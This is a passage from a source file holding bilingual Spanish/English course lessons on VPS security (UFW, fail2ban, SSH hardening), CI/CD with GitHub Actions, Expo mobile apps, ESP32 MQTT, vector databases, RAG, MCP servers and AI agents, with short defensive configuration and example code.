
Detecta ataques de fuerza bruta y banea IPs automáticamente.

\`\`\`bash
# Instalar
apt install fail2ban

# Copiar config (no editar el original)
cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local

# Editar
nano /etc/fail2ban/jail.local
\`\`\`

---

## Configuración fail2ban

\`\`\`ini
# /etc/fail2ban/jail.local

[DEFAULT]
bantime = 1h          # Tiempo de baneo
findtime = 10m        # Ventana de tiempo para contar intentos
maxretry = 5          # Intentos antes de banear
banaction = ufw       # Usar UFW para banear

[sshd]
enabled = true
port = ssh
filter = sshd
logpath = /var/log/auth.log
maxretry = 3          # Más estricto para SSH
bantime = 24h
\`\`\`

\`\`\`bash
# Reiniciar
systemctl restart fail2ban

# Ver estado
fail2ban-client status sshd

# Ver IPs baneadas
fail2ban-client status sshd | grep "Banned IP"

# Desbanear IP
fail2ban-client set sshd unbanip 192.168.1.100
\`\`\`

---

## SSH Hardening

\`\`\`bash
# /etc/ssh/sshd_config

# Deshabilitar login con password
PasswordAuthentication no

# Solo SSH keys
PubkeyAuthentication yes

# No permitir root login
PermitRootLogin no

# Cambiar puerto (opcional, security through obscurity)
Port 2222

# Limitar intentos
MaxAuthTries 3

# Timeout de conexión
ClientAliveInterval 300
ClientAliveCountMax 2

# Solo usuarios específicos
AllowUsers tuusuario

# Reiniciar SSH
systemctl restart sshd
\`\`\`

---

## SSH Keys (obligatorio)

\`\`\`bash
# En tu máquina local
ssh-keygen -t ed25519 -C "tu@email.com"

# Copiar al servidor
ssh-copy-id -i ~/.ssh/id_ed25519.pub usuario@servidor

# O manual
cat ~/.ssh/id_ed25519.pub | ssh usuario@servidor "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"

# Permisos correctos (servidor)
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
\`\`\`

---

## Checklist de seguridad

| Tarea | Comando | Verificar |
|-------|---------|-----------|
| UFW activo | \`ufw status\` | Status: active |
| Solo puertos necesarios | \`ufw status\` | 22, 80, 443 |
| fail2ban corriendo | \`systemctl status fail2ban\` | active (running) |
| SSH solo con keys | \`grep PasswordAuth /etc/ssh/sshd_config\` | no |
| Root login deshabilitado | \`grep PermitRoot /etc/ssh/sshd_config\` | no |
| Updates automáticos | \`apt install unattended-upgrades\` | |

---

## Monitoreo básico

\`\`\`bash
# Ver intentos de login fallidos
grep "Failed password" /var/log/auth.log | tail -20

# Ver IPs baneadas por fail2ban
fail2ban-client status sshd

# Ver conexiones activas
ss -tunap

# Ver procesos escuchando
netstat -tlnp
\`\`\`

---

## Updates de seguridad

\`\`\`bash
# Updates automáticos
apt install unattended-upgrades
dpkg-reconfigure unattended-upgrades

# O manual periódico
apt update && apt upgrade -y
\`\`\`

---

## Recursos

- 📖 [UFW Essentials](https://www.digitalocean.com/community/tutorials/ufw-essentials-common-firewall-rules-and-commands)
- 📖 [fail2ban Documentation](https://www.fail2ban.org/wiki/index.php/Main_Page)
- 📖 [SSH Hardening Guide](https://www.ssh.com/academy/ssh/sshd_config)

---

## Practica

→ [Asegurar VPS: UFW + fail2ban](/es/cooking/vps-hardening)
    `,
    contentEn: `
## Server Security

A VPS exposed to the internet receives attacks constantly. UFW, fail2ban and good SSH practices are your first line of defense.

---

## The reality

\`\`\`bash
# After 1 hour of having a new VPS
cat /var/log/auth.log | grep "Failed password" | wc -l
# → 847 failed login attempts
\`\`\`

Bots constantly scan looking for:
- SSH with weak passwords
- Unnecessary open ports
- Vulnerable services

---

## UFW (Firewall)

UFW = Uncomplicated Firewall. Controls what traffic goes in and out.

\`\`\`bash
# Install
apt install ufw

# Default policy: block everything
ufw default deny incoming
ufw default allow outgoing

# Allow SSH (IMPORTANT! Otherwise you're locked out)
ufw allow ssh
# or specific: ufw allow 22/tcp

# Allow HTTP/HTTPS
ufw allow 80/tcp
ufw allow 443/tcp

# Enable
ufw enable

# Check status
ufw status verbose
\`\`\`

---

## Common UFW rules

\`\`\`bash
# Allow specific port
ufw allow 3000/tcp

# Allow port range
ufw allow 6000:6007/tcp

# Allow from specific IP
ufw allow from 192.168.1.100

# Allow from IP to specific port
ufw allow from 192.168.1.100 to any port 22

# Deny IP (block attacker)
ufw deny from 203.0.113.5

# Delete rule
ufw delete allow 3000/tcp

# See numbered rules (to delete)
ufw status numbered
ufw delete 3
\`\`\`

---

## fail2ban

Detects brute force attacks and bans IPs automatically.

\`\`\`bash
# Install
apt install fail2ban

# Copy config (don't edit the original)
cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local

# Edit
nano /etc/fail2ban/jail.local
\`\`\`

---

## fail2ban configuration

\`\`\`ini
# /etc/fail2ban/jail.local

[DEFAULT]
bantime = 1h          # Ban duration
findtime = 10m        # Time window to count attempts
maxretry = 5          # Attempts before ban
banaction = ufw       # Use UFW to ban

[sshd]
enabled = true
port = ssh
filter = sshd
logpath = /var/log/auth.log
maxretry = 3          # Stricter for SSH
bantime = 24h
\`\`\`

\`\`\`bash
# Restart
systemctl restart fail2ban

# Check status
fail2ban-client status sshd

# See banned IPs
fail2ban-client status sshd | grep "Banned IP"

# Unban IP
fail2ban-client set sshd unbanip 192.168.1.100
\`\`\`

---

## SSH Hardening

\`\`\`bash
# /etc/ssh/sshd_config

# Disable password login
PasswordAuthentication no

# Only SSH keys
PubkeyAuthentication yes

# Don't allow root login
PermitRootLogin no

# Change port (optional, security through obscurity)
Port 2222

# Limit attempts
MaxAuthTries 3

# Connection timeout
ClientAliveInterval 300
ClientAliveCountMax 2

# Only specific users
AllowUsers youruser

# Restart SSH
systemctl restart sshd
\`\`\`

---

## SSH Keys (mandatory)

\`\`\`bash
# On your local machine
ssh-keygen -t ed25519 -C "your@email.com"

# Copy to server
ssh-copy-id -i ~/.ssh/id_ed25519.pub user@server

# Or manually
cat ~/.ssh/id_ed25519.pub | ssh user@server "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"

# Correct permissions (server)
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
\`\`\`

---

## Security checklist

| Task | Command | Verify |
|------|---------|--------|
| UFW active | \`ufw status\` | Status: active |
| Only necessary ports | \`ufw status\` | 22, 80, 443 |
| fail2ban running | \`systemctl status fail2ban\` | active (running) |
| SSH only with keys | \`grep PasswordAuth /etc/ssh/sshd_config\` | no |
| Root login disabled | \`grep PermitRoot /etc/ssh/sshd_config\` | no |
| Automatic updates | \`apt install unattended-upgrades\` | |

---

## Basic monitoring

\`\`\`bash
# See failed login attempts
grep "Failed password" /var/log/auth.log | tail -20

# See IPs banned by fail2ban
fail2ban-client status sshd

# See active connections
ss -tunap

# See listening processes
netstat -tlnp
\`\`\`

---

## Security updates

\`\`\`bash
# Automatic updates
apt install unattended-upgrades
dpkg-reconfigure unattended-upgrades

# Or periodic manual
apt update && apt upgrade -y
\`\`\`

---

## Resources

- 📖 [UFW Essentials](https://www.digitalocean.com/community/tutorials/ufw-essentials-common-firewall-rules-and-commands)
- 📖 [fail2ban Documentation](https://www.fail2ban.org/wiki/index.php/Main_Page)
- 📖 [SSH Hardening Guide](https://www.ssh.com/academy/ssh/sshd_config)

---

## Practice

→ [Secure VPS: UFW + fail2ban](/en/cooking/vps-hardening)
    `,
  },
  cicd: {
    contentEs: `
## Automatización de deploys

CI/CD ejecuta tests y despliega automáticamente cuando haces push.

---

## CI vs CD

| Fase | Qué hace |
|------|----------|
| **CI** (Continuous Integration) | Tests automáticos |
| **CD** (Continuous Deployment) | Deploy automático |

---

## GitHub Actions

\`\`\`yaml
# .github/workflows/deploy.yml
name: Deploy

on:
  push:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
      - run: npm ci
      - run: npm test

  deploy:
    needs: test
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Deploy to VPS
        run: |
          ssh user@server "cd /app && git pull && docker compose up -d --build"
\`\`\`

---

## Secretos

\`\`\`yaml
env:
  API_KEY: \${{ secrets.API_KEY }}
\`\`\`

Configura en: Settings → Secrets → Actions

---

## Buenas prácticas

| Práctica | Por qué |
|----------|---------|
| Tests antes de deploy | No romper producción |
| Branch protection | Review obligatorio |
| Rollback fácil | Volver rápido si falla |

---

## Practica

→ [CI/CD con GitHub Actions](/es/cooking/github-actions)
    `,
    contentEn: `
## Deploy automation

CI/CD runs tests and deploys automatically when you push.

---

## CI vs CD

| Phase | What it does |
|-------|--------------|
| **CI** (Continuous Integration) | Automatic tests |
| **CD** (Continuous Deployment) | Automatic deploy |

---

## GitHub Actions

\`\`\`yaml
# .github/workflows/deploy.yml
name: Deploy

on:
  push:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
      - run: npm ci
      - run: npm test

  deploy:
    needs: test
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Deploy to VPS
        run: |
          ssh user@server "cd /app && git pull && docker compose up -d --build"
\`\`\`

---

## Secrets

\`\`\`yaml
env:
  API_KEY: \${{ secrets.API_KEY }}
\`\`\`

Configure at: Settings → Secrets → Actions

---

## Best practices

| Practice | Why |
|----------|-----|
| Tests before deploy | Don't break production |
| Branch protection | Required review |
| Easy rollback | Quick recovery if fails |

---

## Practice

→ [CI/CD with GitHub Actions](/en/cooking/github-actions)
    `,
  },
  mobile: {
    contentEs: `
## Apps móviles con React

React Native y Expo te permiten crear apps iOS y Android con React.

---

## Expo vs React Native CLI

| Aspecto | Expo | RN CLI |
|---------|------|--------|
| Setup | Fácil | Complejo |
| Build | En la nube | Local |
| Native modules | Limitado | Total |
| Ideal para | 90% de apps | Casos especiales |

---

## Instalación Expo

\`\`\`bash
npx create-expo-app mi-app
cd mi-app
npx expo start
\`\`\`

Escanea el QR con la app Expo Go.

---

## Componentes móviles

\`\`\`tsx
import { View, Text, TouchableOpacity, StyleSheet } from 'react-native'

export default function App() {
  return (
    <View style={styles.container}>
      <Text style={styles.title}>Hola Móvil!</Text>
      <TouchableOpacity style={styles.button}>
        <Text style={styles.buttonText}>Presionar</Text>
      </TouchableOpacity>
    </View>
  )
}

const styles = StyleSheet.create({
  container: { flex: 1, justifyContent: 'center', alignItems: 'center' },
  title: { fontSize: 24, fontWeight: 'bold' },
  button: { backgroundColor: '#3b82f6', padding: 12, borderRadius: 8 },
  buttonText: { color: 'white' },
})
\`\`\`

---

## Navegación

\`\`\`tsx
import { createStackNavigator } from '@react-navigation/stack'

const Stack = createStackNavigator()

function App() {
  return (
    <NavigationContainer>
      <Stack.Navigator>
        <Stack.Screen name="Home" component={HomeScreen} />
        <Stack.Screen name="Details" component={DetailsScreen} />
      </Stack.Navigator>
    </NavigationContainer>
  )
}
\`\`\`

---

## Practica

→ [App Móvil con Expo](/es/cooking/mobile-expo)
    `,
    contentEn: `
## Mobile apps with React

React Native and Expo let you create iOS and Android apps with React.

---

## Expo vs React Native CLI

| Aspect | Expo | RN CLI |
|--------|------|--------|
| Setup | Easy | Complex |
| Build | In cloud | Local |
| Native modules | Limited | Full |
| Ideal for | 90% of apps | Special cases |

---

## Expo installation

\`\`\`bash
npx create-expo-app my-app
cd my-app
npx expo start
\`\`\`

Scan the QR with the Expo Go app.

---

## Mobile components

\`\`\`tsx
import { View, Text, TouchableOpacity, StyleSheet } from 'react-native'

export default function App() {
  return (
    <View style={styles.container}>
      <Text style={styles.title}>Hello Mobile!</Text>
      <TouchableOpacity style={styles.button}>
        <Text style={styles.buttonText}>Press</Text>
      </TouchableOpacity>
    </View>
  )
}

const styles = StyleSheet.create({
  container: { flex: 1, justifyContent: 'center', alignItems: 'center' },
  title: { fontSize: 24, fontWeight: 'bold' },
  button: { backgroundColor: '#3b82f6', padding: 12, borderRadius: 8 },
  buttonText: { color: 'white' },
})
\`\`\`

---

## Navigation

\`\`\`tsx
import { createStackNavigator } from '@react-navigation/stack'

const Stack = createStackNavigator()

function App() {
  return (
    <NavigationContainer>
      <Stack.Navigator>
        <Stack.Screen name="Home" component={HomeScreen} />
        <Stack.Screen name="Details" component={DetailsScreen} />
      </Stack.Navigator>
    </NavigationContainer>
  )
}
\`\`\`

---

## Practice

→ [Mobile App with Expo](/en/cooking/mobile-expo)
    `,
  },
  iot: {
    contentEs: `
## Hardware + Software

IoT conecta dispositivos físicos a internet y la nube.

---

## Componentes típicos

| Componente | Función |
|------------|---------|
| **Microcontroller** | Arduino, ESP32 |
| **Sensores** | Temperatura, movimiento |
| **Actuadores** | LEDs, motores, relays |
| **Comunicación** | WiFi, MQTT, HTTP |

---

## Arduino básico

\`\`\`cpp
// Blink LED
void setup() {
  pinMode(LED_BUILTIN, OUTPUT);
}

void loop() {
  digitalWrite(LED_BUILTIN, HIGH);
  delay(1000);
  digitalWrite(LED_BUILTIN, LOW);
  delay(1000);
}
\`\`\`

---

## MQTT

Protocolo ligero para IoT:

\`\`\`
Sensor → Broker MQTT → Tu servidor
                    ↓
                 Dashboard
\`\`\`

---

## ESP32 + MQTT

\`\`\`cpp
#include <WiFi.h>
#include <PubSubClient.h>

WiFiClient espClient;
PubSubClient client(espClient);

void setup() {
  WiFi.begin("SSID", "password");
  client.setServer("broker.hivemq.com", 1883);
}

void loop() {
  float temp = readTemperature();
  client.publish("home/temperature", String(temp).c_str());
  delay(5000);
}
\`\`\`

---

## Servicios cloud

| Servicio | Uso |
|----------|-----|
| **AWS IoT** | Enterprise |
| **HiveMQ** | MQTT gratis |
| **Adafruit IO** | Hobby |

---

## Practica

→ [Arduino + MQTT](/es/cooking/arduino-sensor)
    `,
    contentEn: `
## Hardware + Software

IoT connects physical devices to the internet and cloud.

---

## Typical components

| Component | Function |
|-----------|----------|
| **Microcontroller** | Arduino, ESP32 |
| **Sensors** | Temperature, motion |
| **Actuators** | LEDs, motors, relays |
| **Communication** | WiFi, MQTT, HTTP |

---

## Basic Arduino

\`\`\`cpp
// Blink LED
void setup() {
  pinMode(LED_BUILTIN, OUTPUT);
}

void loop() {
  digitalWrite(LED_BUILTIN, HIGH);
  delay(1000);
  digitalWrite(LED_BUILTIN, LOW);
  delay(1000);
}
\`\`\`

---

## MQTT

Lightweight protocol for IoT:

\`\`\`
Sensor → MQTT Broker → Your server
                    ↓
                 Dashboard
\`\`\`

---

## ESP32 + MQTT

\`\`\`cpp
#include <WiFi.h>
#include <PubSubClient.h>

WiFiClient espClient;
PubSubClient client(espClient);

void setup() {
  WiFi.begin("SSID", "password");
  client.setServer("broker.hivemq.com", 1883);
}

void loop() {
  float temp = readTemperature();
  client.publish("home/temperature", String(temp).c_str());
  delay(5000);
}
\`\`\`

---

## Cloud services

| Service | Use |
|---------|-----|
| **AWS IoT** | Enterprise |
| **HiveMQ** | Free MQTT |
| **Adafruit IO** | Hobby |

---

## Practice

→ [Arduino + MQTT](/en/cooking/arduino-sensor)
    `,
  },

  // =============================================
  // MASTER CHEF - Temas IA Avanzada
  // =============================================

  'vector-db': {
    contentEs: `
## ¿Qué son las bases de datos vectoriales?

Almacenan **embeddings** (vectores numéricos) para búsqueda por similitud semántica.

---

## El problema tradicional

\`\`\`
SQL: WHERE title LIKE '%gato%'
→ Solo encuentra "gato", no "felino" ni "mascota"

Vector: embedding("gato")
→ Encuentra conceptos SIMILARES semánticamente
\`\`\`

---

## ¿Cómo funcionan?

| Paso | Proceso |
|------|---------|
| 1. **Embed** | Texto → Vector [0.1, 0.3, ...] |
| 2. **Store** | Guardar vector en DB |
| 3. **Query** | Buscar vectores similares |
| 4. **Return** | Resultados por coseno/distancia |

---

## Bases de datos populares

| DB | Tipo | Ideal para |
|----|------|------------|
| **Pinecone** | Cloud | Producción fácil |
| **Weaviate** | Self-host | Control total |
| **ChromaDB** | Local | Desarrollo |
| **pgvector** | PostgreSQL | Si ya usas Postgres |
| **Qdrant** | Self-host | Alto rendimiento |

---

## Ejemplo con ChromaDB

\`\`\`python
import chromadb

# Crear cliente
client = chromadb.Client()
collection = client.create_collection("docs")

# Agregar documentos (auto-embedding)
collection.add(
    documents=["El gato duerme", "El perro corre"],
    ids=["doc1", "doc2"]
)

# Buscar similares
results = collection.query(
    query_texts=["mascota descansando"],
    n_results=1
)
# → Encuentra "El gato duerme"
\`\`\`

---

## Índices vectoriales

| Algoritmo | Velocidad | Precisión |
|-----------|-----------|-----------|
| **Flat** | Lento | 100% |
| **IVF** | Medio | ~95% |
| **HNSW** | Rápido | ~95% |

---

## Practica

→ [Búsqueda Vectorial](/es/cooking/vector-search)
    `,
    contentEn: `
## What are vector databases?

They store **embeddings** (numeric vectors) for semantic similarity search.

---

## The traditional problem

\`\`\`
SQL: WHERE title LIKE '%cat%'
→ Only finds "cat", not "feline" or "pet"

Vector: embedding("cat")
→ Finds semantically SIMILAR concepts
\`\`\`

---

## How they work

| Step | Process |
|------|---------|
| 1. **Embed** | Text → Vector [0.1, 0.3, ...] |
| 2. **Store** | Save vector in DB |
| 3. **Query** | Search similar vectors |
| 4. **Return** | Results by cosine/distance |

---

## Popular databases

| DB | Type | Ideal for |
|----|------|-----------|
| **Pinecone** | Cloud | Easy production |
| **Weaviate** | Self-host | Full control |
| **ChromaDB** | Local | Development |
| **pgvector** | PostgreSQL | If using Postgres |
| **Qdrant** | Self-host | High performance |

---

## ChromaDB example

\`\`\`python
import chromadb

# Create client
client = chromadb.Client()
collection = client.create_collection("docs")

# Add documents (auto-embedding)
collection.add(
    documents=["The cat sleeps", "The dog runs"],
    ids=["doc1", "doc2"]
)

# Search similar
results = collection.query(
    query_texts=["pet resting"],
    n_results=1
)
# → Finds "The cat sleeps"
\`\`\`

---

## Vector indexes

| Algorithm | Speed | Precision |
|-----------|-------|-----------|
| **Flat** | Slow | 100% |
| **IVF** | Medium | ~95% |
| **HNSW** | Fast | ~95% |

---

## Practice

→ [Vector Search](/en/cooking/vector-search)
    `,
  },

  'rag': {
    contentEs: `
## Retrieval Augmented Generation

RAG = **Buscar info relevante** + **Darla al LLM** = Respuestas precisas con fuentes

---

## ¿Por qué RAG?

| Sin RAG | Con RAG |
|---------|---------|
| LLM solo sabe lo que aprendió | LLM accede a TUS documentos |
| Puede inventar ("alucinar") | Cita fuentes reales |
| Conocimiento estático | Info siempre actualizada |

---

## Arquitectura RAG

\`\`\`
                 ┌─────────────────┐
                 │   Tu pregunta   │
                 └────────┬────────┘
                          ↓
┌─────────────────────────────────────────────┐
│              1. RETRIEVAL                    │
│  Query → Vector DB → Top K documentos        │
└────────┬────────────────────────────────────┘
         ↓
┌─────────────────────────────────────────────┐
│              2. AUGMENTATION                 │
│  Prompt + Contexto de documentos             │
└────────┬────────────────────────────────────┘
         ↓
┌─────────────────────────────────────────────┐
│              3. GENERATION                   │
│  LLM genera respuesta con contexto           │
└─────────────────────────────────────────────┘
\`\`\`

---

## Flujo de indexación

\`\`\`python
# 1. Cargar documentos
docs = load_pdfs("./docs/")

# 2. Chunking (dividir en partes)
chunks = split_text(docs, chunk_size=500)

# 3. Embeddings
embeddings = model.embed(chunks)

# 4. Guardar en vector DB
vector_db.add(embeddings, chunks)
\`\`\`

---

## Chunking strategies

| Estrategia | Cuando usar |
|------------|-------------|
| **Fixed size** | Documentos simples |
| **Sentence** | Texto natural |
| **Semantic** | Alta precisión |
| **Recursive** | Documentos largos |

---

## Prompt template RAG

\`\`\`
Responde usando SOLO la información del contexto.
Si no está en el contexto, di "No tengo esa información".

CONTEXTO:
{chunks_relevantes}

PREGUNTA: {user_question}
\`\`\`

---

## Métricas de calidad

| Métrica | Qué mide |
|---------|----------|
| **Relevance** | ¿Chunks correctos? |
| **Faithfulness** | ¿Respuesta basada en contexto? |
| **Answer quality** | ¿Respuesta útil? |

---

## 📚 Caso Real: RAG para Compliance

Las empresas financieras tienen cientos de PDFs de políticas y regulaciones. RAG permite buscar en ellos con lenguaje natural.

### Ejemplo: Buscador de Políticas Internas

\`\`\`python
# Documentos de compliance
docs = [
    "politica_aml.pdf",
    "manual_kyc.pdf",
    "regulacion_cnbv_2024.pdf",
    "procedimiento_fraudes.pdf",
    "codigo_etica.pdf"
]

# Indexar una vez
for doc in docs:
    chunks = split_pdf(doc, chunk_size=500)
    embeddings = model.embed(chunks)
    vector_db.add(embeddings, chunks, metadata={"source": doc})

# Consulta de empleado
query = "¿Cuál es el límite para transacciones sin verificación adicional?"

# Buscar en todos los documentos
results = vector_db.search(query, top_k=5)

# Respuesta con fuente
response = llm.generate(
    prompt=f"Contexto: {results}\\n\\nPregunta: {query}",
    system="Responde citando el documento y sección específica."
)
# "Según la política AML sección 4.2, las transacciones
#  mayores a $15,000 MXN requieren verificación adicional..."
\`\`\`

### Por qué es valioso en Fintech

| Sin RAG | Con RAG |
|---------|---------|
| Buscar en 50 PDFs manualmente | Pregunta en lenguaje natural |
| "No sé dónde está esa política" | Respuesta + fuente exacta |
| Empleados inventan respuestas | Basado en documentos reales |
| Auditor pide evidencia → pánico | Link directo al párrafo |

### Consideraciones de seguridad

\`\`\`python
# SIEMPRE incluir la fuente para auditoría
response = {
    "answer": "...",
    "sources": [
        {"doc": "politica_aml.pdf", "page": 12, "section": "4.2"},
        {"doc": "manual_kyc.pdf", "page": 5, "section": "2.1"}
    ],
    "confidence": 0.92
}

# Si no hay match confiable, NO inventar
if confidence < 0.7:
    response["answer"] = "No encontré información específica. Consulta con Compliance."
\`\`\`

> 💡 RAG para compliance reduce tiempo de búsqueda de horas a segundos, y siempre cita la fuente.

---

## Practica

→ [RAG con Documentos PDF](/es/cooking/rag-documents)
    `,
    contentEn: `
## Retrieval Augmented Generation

RAG = **Search relevant info** + **Give it to LLM** = Precise answers with sources

---

## Why RAG?

| Without RAG | With RAG |
|-------------|----------|
| LLM only knows what it learned | LLM accesses YOUR documents |
| May invent ("hallucinate") | Cites real sources |
| Static knowledge | Always updated info |

---

## RAG Architecture

\`\`\`
                 ┌─────────────────┐
                 │   Your question │
                 └────────┬────────┘
                          ↓
┌─────────────────────────────────────────────┐
│              1. RETRIEVAL                    │
│  Query → Vector DB → Top K documents         │
└────────┬────────────────────────────────────┘
         ↓
┌─────────────────────────────────────────────┐
│              2. AUGMENTATION                 │
│  Prompt + Document context                   │
└────────┬────────────────────────────────────┘
         ↓
┌─────────────────────────────────────────────┐
│              3. GENERATION                   │
│  LLM generates response with context         │
└─────────────────────────────────────────────┘
\`\`\`

---

## Indexing flow

\`\`\`python
# 1. Load documents
docs = load_pdfs("./docs/")

# 2. Chunking (split into parts)
chunks = split_text(docs, chunk_size=500)

# 3. Embeddings
embeddings = model.embed(chunks)

# 4. Save to vector DB
vector_db.add(embeddings, chunks)
\`\`\`

---

## Chunking strategies

| Strategy | When to use |
|----------|-------------|
| **Fixed size** | Simple documents |
| **Sentence** | Natural text |
| **Semantic** | High precision |
| **Recursive** | Long documents |

---

## RAG prompt template

\`\`\`
Answer using ONLY information from the context.
If not in context, say "I don't have that information".

CONTEXT:
{relevant_chunks}

QUESTION: {user_question}
\`\`\`

---

## Quality metrics

| Metric | What it measures |
|--------|------------------|
| **Relevance** | Correct chunks? |
| **Faithfulness** | Response based on context? |
| **Answer quality** | Useful response? |

---

## 🏦 Fintech Case: Compliance Documents

Regulations (PCI DSS, SOC 2, AML) generate hundreds of PDFs. RAG lets employees **query in natural language**:

\`\`\`python
# Index compliance documents
from langchain.document_loaders import PyPDFLoader
from langchain.vectorstores import Qdrant

# Load AML policy, KYC manual, internal procedures
docs = []
for pdf in ["aml_policy.pdf", "kyc_manual.pdf", "fraud_procedures.pdf"]:
    docs.extend(PyPDFLoader(f"compliance/{pdf}").load())

# Index with source metadata
vectorstore = Qdrant.from_documents(
    docs,
    embeddings,
    metadata=lambda doc: {"source": doc.metadata["source"], "page": doc.metadata["page"]}
)

# Employee query
query = "What are the maximum limits for transactions without additional KYC verification?"
results = vectorstore.similarity_search(query, k=3)
\`\`\`

### Why it's valuable in Fintech

| Without RAG | With RAG |
|-------------|----------|
| Manually search 50 PDFs | Natural language query |
| "I don't know where that policy is" | Answer + exact source |
| Employees make up answers | Based on real documents |
| Auditor asks for evidence → panic | Direct link to paragraph |

### Security considerations

\`\`\`python
# ALWAYS include source for audit trail
response = {
    "answer": "...",
    "sources": [
        {"doc": "aml_policy.pdf", "page": 12, "section": "4.2"},
        {"doc": "kyc_manual.pdf", "page": 5, "section": "2.1"}
    ],
    "confidence": 0.92
}

# If no confident match, DON'T make things up
if confidence < 0.7:
    response["answer"] = "I didn't find specific information. Please consult with Compliance."
\`\`\`

> 💡 RAG for compliance reduces search time from hours to seconds, and always cites the source.

---

## Practice

→ [RAG with PDF Documents](/en/cooking/rag-documents)
    `,
  },

  'mcp': {
    contentEs: `
## Model Context Protocol

MCP = Protocolo estándar para conectar LLMs con **herramientas y datos externos**.

---

## ¿Por qué MCP?

| Sin MCP | Con MCP |
|---------|---------|
| Cada app su integración | Protocolo unificado |
| APIs custom por modelo | Funciona con cualquier LLM |
| Difícil mantener | Servidores reutilizables |

---

## Arquitectura MCP

\`\`\`
┌──────────────┐     ┌──────────────┐     ┌──────────────┐
│   Cliente    │ ←→  │  Servidor    │ ←→  │   Recurso    │
│  (Claude)    │     │    MCP       │     │  (DB, API)   │
└──────────────┘     └──────────────┘     └──────────────┘
                           ↑
                     stdio / SSE
\`\`\`

---

## Conceptos clave

| Concepto | Descripción |
|----------|-------------|
| **Tools** | Funciones que el LLM puede llamar |
| **Resources** | Datos que el LLM puede leer |
| **Prompts** | Templates predefinidos |
| **Sampling** | LLM genera contenido |

---

## Servidor MCP básico

\`\`\`typescript
import { Server } from "@modelcontextprotocol/sdk/server/index.js";
import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio.js";

const server = new Server({
  name: "mi-servidor",
  version: "1.0.0"
});

// Definir herramienta
server.setRequestHandler("tools/list", async () => ({
  tools: [{
    name: "saludar",
    description: "Saluda a una persona",
    inputSchema: {
      type: "object",
      properties: {
        nombre: { type: "string" }
      }
    }
  }]
}));

// Implementar herramienta
server.setRequestHandler("tools/call", async (request) => {
  if (request.params.name === "saludar") {
    return { content: [{ type: "text", text: \`¡Hola \${request.params.arguments.nombre}!\` }] };
  }
});

// Iniciar
const transport = new StdioServerTransport();
await server.connect(transport);
\`\`\`

---

## Configurar en Claude Desktop

\`\`\`json
{
  "mcpServers": {
    "mi-servidor": {
      "command": "node",
      "args": ["./build/index.js"]
    }
  }
}
\`\`\`

---

## Servidores MCP populares

| Servidor | Función |
|----------|---------|
| **filesystem** | Leer/escribir archivos |
| **github** | Repos, PRs, issues |
| **postgres** | Consultas SQL |
| **brave-search** | Búsqueda web |

---

## Practica

→ [Servidor MCP Custom](/es/cooking/mcp-server)
    `,
    contentEn: `
## Model Context Protocol

MCP = Standard protocol to connect LLMs with **external tools and data**.

---

## Why MCP?

| Without MCP | With MCP |
|-------------|----------|
| Each app its own integration | Unified protocol |
| Custom APIs per model | Works with any LLM |
| Hard to maintain | Reusable servers |

---

## MCP Architecture

\`\`\`
┌──────────────┐     ┌──────────────┐     ┌──────────────┐
│    Client    │ ←→  │    MCP       │ ←→  │   Resource   │
│   (Claude)   │     │   Server     │     │  (DB, API)   │
└──────────────┘     └──────────────┘     └──────────────┘
                           ↑
                     stdio / SSE
\`\`\`

---

## Key concepts

| Concept | Description |
|---------|-------------|
| **Tools** | Functions the LLM can call |
| **Resources** | Data the LLM can read |
| **Prompts** | Predefined templates |
| **Sampling** | LLM generates content |

---

## Basic MCP server

\`\`\`typescript
import { Server } from "@modelcontextprotocol/sdk/server/index.js";
import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio.js";

const server = new Server({
  name: "my-server",
  version: "1.0.0"
});

// Define tool
server.setRequestHandler("tools/list", async () => ({
  tools: [{
    name: "greet",
    description: "Greet a person",
    inputSchema: {
      type: "object",
      properties: {
        name: { type: "string" }
      }
    }
  }]
}));

// Implement tool
server.setRequestHandler("tools/call", async (request) => {
  if (request.params.name === "greet") {
    return { content: [{ type: "text", text: \`Hello \${request.params.arguments.name}!\` }] };
  }
});

// Start
const transport = new StdioServerTransport();
await server.connect(transport);
\`\`\`

---

## Configure in Claude Desktop

\`\`\`json
{
  "mcpServers": {
    "my-server": {
      "command": "node",
      "args": ["./build/index.js"]
    }
  }
}
\`\`\`

---

## Popular MCP servers

| Server | Function |
|--------|----------|
| **filesystem** | Read/write files |
| **github** | Repos, PRs, issues |
| **postgres** | SQL queries |
| **brave-search** | Web search |

---

## Practice

→ [Custom MCP Server](/en/cooking/mcp-server)
    `,
  },

  'agents': {
    contentEs: `
## Agentes IA Autónomos

Un agente = LLM + **herramientas** + **bucle de razonamiento** para completar tareas complejas.

---

## Agente vs Chatbot

| Chatbot | Agente |
|---------|--------|
| Una respuesta | Múltiples pasos |
| Sin herramientas | Usa herramientas |
| Reactivo | Proactivo |
| Tú controlas | Él decide |

---

## Arquitectura de un agente

\`\`\`
              ┌─────────────────────────────────┐
              │           AGENTE                │
              │  ┌─────────────────────────┐    │
              │  │      Razonamiento       │    │
  Tarea  ───→ │  │  (ReAct, CoT, ToT)      │ ───→ Resultado
              │  └───────────┬─────────────┘    │
              │              ↓                  │
              │  ┌─────────────────────────┐    │
              │  │     Herramientas        │    │
              │  │  [Web] [Code] [Files]   │    │
              │  └─────────────────────────┘    │
              └─────────────────────────────────┘
\`\`\`

---

## Patrón ReAct

\`\`\`
Thought: Necesito buscar el clima de Madrid
Action: search_weather("Madrid")
Observation: 22°C, soleado
Thought: Ya tengo la info
Action: respond("El clima en Madrid es 22°C...")
\`\`\`

---

## Herramientas comunes

| Herramienta | Uso |
|-------------|-----|
| **web_search** | Buscar información |
| **read_file** | Leer documentos |
| **write_file** | Crear archivos |
| **run_code** | Ejecutar Python |
| **ask_user** | Pedir clarificación |

---

